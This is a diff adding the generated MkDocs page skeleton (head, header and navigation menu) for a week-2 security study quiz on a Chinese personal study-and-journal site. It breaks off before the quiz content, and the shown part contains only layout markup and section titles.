@@ -1,0 +1,3284 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="安全学习笔记 × 青春记录 | 一个可以安全试错的环境">
+      
+      
+        <meta name="author" content="ethicalpaws">
+      
+      
+        <link rel="canonical" href="https://ethicalpaws.github.io/youth-sandbox/tech-study/weekly-check/week2/detection/">
+      
+      
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>本周学习检测题（第 2 周） - 青春沙盒</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../css/timeago.css">
+    
+      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    
+    <script>__md_scope=new URL("../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="deep-purple">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#2" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../../.." title="青春沙盒" class="md-header__button md-logo" aria-label="青春沙盒" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M6.5 20q-2.28 0-3.89-1.57Q1 16.85 1 14.58q0-1.95 1.17-3.48 1.18-1.53 3.08-1.95.63-2.3 2.5-3.72Q9.63 4 12 4q2.93 0 4.96 2.04Q19 8.07 19 11q1.73.2 2.86 1.5 1.14 1.28 1.14 3 0 1.88-1.31 3.19T18.5 20Z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            青春沙盒
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              本周学习检测题（第 2 周）
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="deep-purple"  aria-label="切换到深色模式"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="切换到深色模式" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="deep-purple" data-md-color-accent="indigo"  aria-label="切换到浅色模式"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="切换到浅色模式" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="Share" aria-label="Share" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/ethicalpaws/youth-sandbox" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    youth-sandbox
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  🏠 首页
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../" class="md-tabs__link">
+          
+  
+  
+    
+  
+  📚 技术学习
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../life/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  🌱 青春记录
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../updates/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  🔔 动态推送
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../spiritual/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  🔋 精神食粮
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../about/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  📄 关于本站
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../../role-panel/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  🎮 角色档案
+
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../.." title="青春沙盒" class="md-nav__button md-logo" aria-label="青春沙盒" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M6.5 20q-2.28 0-3.89-1.57Q1 16.85 1 14.58q0-1.95 1.17-3.48 1.18-1.53 3.08-1.95.63-2.3 2.5-3.72Q9.63 4 12 4q2.93 0 4.96 2.04Q19 8.07 19 11q1.73.2 2.86 1.5 1.14 1.28 1.14 3 0 1.88-1.31 3.19T18.5 20Z"/></svg>
+
+    </a>
+    青春沙盒
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/ethicalpaws/youth-sandbox" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    youth-sandbox
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🏠 首页
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    📚 技术学习
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2" id="__nav_2_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    📚 技术学习
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_2" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../knowledge/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    📖 知识笔记
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    📖 知识笔记
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../knowledge/01-foundation/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    01-基础知识
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../knowledge/02-network-protocol-security/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    02-网络协议安全
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../knowledge/03-web-basics/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    03-Web基础漏洞
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../knowledge/04-web-advanced/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    04-Web高级漏洞
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../knowledge/05-java-security/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    05-Java安全
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../knowledge/06-red-blue-confrontation/index.md" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    06-红蓝对抗
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_3" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../practice/ctf/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🎯 实战练习
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    🎯 实战练习
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../practice/index.md" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    实战总览
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../practice/cve/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CVE分析
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../practice/labs/index.md" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    靶场练习
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../practice/src/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SRC实战
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_4" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    📋 每周检测
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    📋 每周检测
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../life/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🌱 青春记录
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3" id="__nav_3_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    🌱 青春记录
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3_2" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../life/study-plan/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    📝 每周计划
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3_2" id="__nav_3_2_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    📝 每周计划
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../life/study-plan/week1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    第1周
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../life/study-plan/week2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    第2周
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../life/study-plan/week3/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    第3周
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../life/journal/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    📔 随笔日记
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../life/struggles/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    [Protected] 💭 烦恼记录
+  
+
+    
+  </span>
+  
+    
+  
+  
+    <span class="md-status md-status--encrypted"></span>
+  
+
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3_5" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../life/wins/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🎉 成就时刻
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_5_label" aria-expanded="false">
